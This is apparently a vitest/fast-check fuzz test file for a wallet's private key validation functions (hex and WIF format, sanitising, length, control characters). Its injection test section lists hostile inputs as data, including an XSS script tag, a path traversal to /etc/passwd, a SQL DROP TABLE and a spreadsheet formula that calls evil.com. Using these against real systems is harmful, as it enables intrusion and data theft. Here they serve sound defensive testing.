/**
 * Fuzz tests for private key validation
 * Tests private key format validation with random inputs
 */
import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import {
  validatePrivateKeyFormat,
  sanitizePrivateKey,
  containsDangerousChars,
  validatePrivateKeyLength,
  detectPrivateKeyFormat
} from '../privateKey';

// Helper to generate hex strings since fc.hexaString doesn't exist
const hexChar = fc.constantFrom(...'0123456789abcdefABCDEF'.split(''));
const hexString = (length: number) => fc.array(hexChar, { minLength: length, maxLength: length }).map(arr => arr.join(''));
const hexStringRange = (min: number, max: number) => fc.array(hexChar, { minLength: min, maxLength: max }).map(arr => arr.join(''));

// Helper to generate base58 strings for WIF format
const base58Char = fc.constantFrom(...'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'.split(''));
const base58String = (length: number) => fc.array(base58Char, { minLength: length, maxLength: length }).map(arr => arr.join(''));

// Helper to generate safe alphanumeric strings
const alphaNumChar = fc.constantFrom(...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.split(''));
const alphaNumString = (min: number, max: number) => fc.array(alphaNumChar, { minLength: min, maxLength: max }).map(arr => arr.join(''));

describe('Private Key Validation Fuzz Tests', () => {
  describe('validatePrivateKeyFormat', () => {
    it('should handle arbitrary string inputs without crashing', () => {
      fc.assert(
        fc.property(
          fc.string(),
          (input) => {
            expect(() => {
              validatePrivateKeyFormat(input);
            }).not.toThrow();
            
            const result = validatePrivateKeyFormat(input);
            expect(result).toHaveProperty('isValid');
            expect(typeof result.isValid).toBe('boolean');
          }
        ),
        { numRuns: 100 }  // Reduced from 1000 for performance
      );
    });

    it('should accept valid 64-char hex private keys', () => {
      fc.assert(
        fc.property(
          hexString(64),
          (hex) => {
            const result = validatePrivateKeyFormat(hex);
            expect(result.isValid).toBe(true);
            expect(result.format).toBe('hex');
          }
        ),
        { numRuns: 50 }  // Reduced from 100
      );
    });

    it('should reject hex keys with 0x prefix', () => {
      fc.assert(
        fc.property(
          hexString(64),
          (hex) => {
            const withPrefix = '0x' + hex;
            const result = validatePrivateKeyFormat(withPrefix);
            expect(result.isValid).toBe(false);
            expect(result.error).toContain('Remove 0x prefix');
          }
        ),
        { numRuns: 20 }  // Reduced from 50
      );
    });

    it('should reject hex keys with wrong length', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            hexStringRange(1, 63),
            hexStringRange(65, 100)
          ),
          (hex) => {
            // Skip WIF-like lengths
            if (hex.length === 51 || hex.length === 52) return;
            
            const result = validatePrivateKeyFormat(hex);
            if (hex.length < 51) {
              expect(result.error).toContain('too short');
            } else if (hex.length === 62 || hex.length === 63 || hex.length === 65 || hex.length === 66) {
              expect(result.error).toContain('exactly 64 characters');
            }
          }
        ),
        { numRuns: 50 }  // Reduced from 100
      );
    });

    it('should reject formula injection attempts', () => {
      const injectionPrefixes = ['=', '@', '+', '-'];
      
      fc.assert(
        fc.property(
          fc.tuple(
            fc.constantFrom(...injectionPrefixes),
            fc.string({ minLength: 1, maxLength: 100 })
          ),
          ([prefix, suffix]) => {
            const injectionAttempt = prefix + suffix;
            const result = validatePrivateKeyFormat(injectionAttempt);
            expect(result.isValid).toBe(false);
            expect(result.error).toContain('Invalid private key format');
          }
        ),
        { numRuns: 50 }  // Reduced from 100
      );
    });

    it('should handle edge cases', () => {
      const edgeCases = [
        '',
        ' ',
        '\t',
        '\n',
        'null',
        'undefined',
        '0',
        '00000000000000000000000000000000000000000000000000000000000000000',
        'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
        'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'
      ];

      edgeCases.forEach(value => {
        const result = validatePrivateKeyFormat(value);
        expect(() => validatePrivateKeyFormat(value)).not.toThrow();
        
        // Empty strings should be invalid
        if (value.trim() === '') {
          expect(result.isValid).toBe(false);
          expect(result.error).toContain('required');
        }
      });
    });

    it('should accept valid WIF formats', () => {
      // Valid WIF formats start with specific characters and have specific lengths
      const wifPrefixes = ['5', 'K', 'L']; // Mainnet WIF prefixes
      
      fc.assert(
        fc.property(
          fc.tuple(
            fc.constantFrom(...wifPrefixes),
            base58String(50)
          ),
          ([prefix, suffix]) => {
            const wif = prefix + suffix;
            const result = validatePrivateKeyFormat(wif);
            // We expect valid WIF format to pass basic validation
            // The actual WIF validation would need proper base58 checking
            expect(() => validatePrivateKeyFormat(wif)).not.toThrow();
          }
        ),
        { numRuns: 20 }  // Reduced from 50
      );
    });
  });

  describe('sanitizePrivateKey', () => {
    it('should handle arbitrary inputs without crashing', () => {
      fc.assert(
        fc.property(
          fc.string(),
          (input) => {
            expect(() => {
              sanitizePrivateKey(input);
            }).not.toThrow();
            
            const result = sanitizePrivateKey(input);
            expect(typeof result).toBe('string');
          }
        ),
        { numRuns: 100 }  // Reduced from 500
      );
    });

    it('should remove whitespace and normalize', () => {
      fc.assert(
        fc.property(
          fc.tuple(
            fc.string({ minLength: 1, maxLength: 100 }),
            fc.array(fc.constantFrom(' ', '\t', '\n', '\r'), { minLength: 1, maxLength: 5 })
          ),
          ([content, whitespace]) => {
            const withWhitespace = whitespace.join('') + content + whitespace.join('');
            const sanitized = sanitizePrivateKey(withWhitespace);
            
            // Should not have leading/trailing whitespace
            expect(sanitized).toBe(sanitized.trim());
          }
        ),
        { numRuns: 50 }  // Reduced from 100
      );
    });
  });

  describe('containsDangerousChars', () => {
    it('should detect dangerous control characters', () => {
      // The function checks for control characters (\x00-\x08, \x0B, \x0C, \x0E-\x1F, \x7F)
      const dangerousChars = ['\x00', '\x01', '\x07', '\x0B', '\x0C', '\x0E', '\x1F', '\x7F'];
      
      fc.assert(
        fc.property(
          fc.tuple(
            alphaNumString(0, 50),  // Safe prefix
            fc.constantFrom(...dangerousChars),
            alphaNumString(0, 50)   // Safe suffix
          ),
          ([prefix, dangerous, suffix]) => {
            const input = prefix + dangerous + suffix;
            const result = containsDangerousChars(input);
            expect(result).toBe(true);
          }
        ),
        { numRuns: 50 }
      );
    });

    it('should accept safe characters', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            hexStringRange(0, 100),
            alphaNumString(0, 100)
          ),
          (safe) => {
            const result = containsDangerousChars(safe);
            expect(result).toBe(false);
          }
        ),
        { numRuns: 50 }  // Reduced from 100
      );
    });
  });

  describe('validatePrivateKeyLength', () => {
    it('should validate key length', () => {
      fc.assert(
        fc.property(
          fc.string({ minLength: 0, maxLength: 200 }),
          (str) => {
            const result = validatePrivateKeyLength(str);
            
            // Function checks for length 64 (hex) or 51-52 (WIF)
            if (str.trim().length === 0) {
              expect(result.isValid).toBe(false);
              expect(result.error).toContain('empty');
            } else if (str.trim().length > 1000) {
              expect(result.isValid).toBe(false);
              expect(result.error).toContain('suspiciously long');
            } else if (str.trim().length === 64 || str.trim().length === 51 || str.trim().length === 52) {
              expect(result.isValid).toBe(true);
            } else {
              expect(result.isValid).toBe(false);
              expect(result.error).toContain('Invalid private key length');
            }
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  describe('detectPrivateKeyFormat', () => {
    it('should detect hex format', () => {
      fc.assert(
        fc.property(
          hexString(64),
          (hex) => {
            const format = detectPrivateKeyFormat(hex);
            expect(format).toBe('hex');
          }
        ),
        { numRuns: 20 }
      );
    });

    it('should detect WIF format by prefix', () => {
      const wifPrefixes = ['5', 'K', 'L'];
      
      wifPrefixes.forEach(prefix => {
        fc.assert(
          fc.property(
            fc.oneof(base58String(50), base58String(51)),
            (suffix) => {
              const wif = prefix + suffix;
              const format = detectPrivateKeyFormat(wif);
              expect(format).toBe('wif');
            }
          ),
          { numRuns: 10 }
        );
      });
    });

    it('should return unknown for invalid formats', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            fc.string({ minLength: 1, maxLength: 30 }),
            fc.string({ minLength: 100, maxLength: 200 })
          ),
          (invalid) => {
            const format = detectPrivateKeyFormat(invalid);
            // The function returns 'unknown' not null
            if (!(/^[0-9a-fA-F]{64}$/.test(invalid.trim())) && 
                !(/^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(invalid.trim()))) {
              expect(format).toBe('unknown');
            }
          }
        ),
        { numRuns: 50 }
      );
    });
  });

  describe('Security and injection tests', () => {
    it('should handle injection attempts safely', () => {
      const injections = [
        '<script>alert(1)</script>',
        '${process.env.SECRET}',
        '../../etc/passwd',
        'DROP TABLE wallets',
        '\\x00\\x01\\x02',
        '{{template}}',
        'javascript:alert(1)',
        '=IMPORTDATA("http://evil.com")',
        '@SUM(A1:A10)'
      ];

      injections.forEach(injection => {
        expect(() => {
          validatePrivateKeyFormat(injection);
          sanitizePrivateKey(injection);
          containsDangerousChars(injection);
          detectPrivateKeyFormat(injection);
        }).not.toThrow();
        
        const result = validatePrivateKeyFormat(injection);
        expect(result.isValid).toBe(false);
      });
    });

    it('should handle extremely large inputs without performance issues', () => {
      const hugeString = 'a'.repeat(10000);
      
      const start = Date.now();
      validatePrivateKeyFormat(hugeString);
      sanitizePrivateKey(hugeString);
      containsDangerousChars(hugeString);
      const elapsed = Date.now() - start;
      
      // Should complete quickly even with huge input
      expect(elapsed).toBeLessThan(100);
    });
  });
});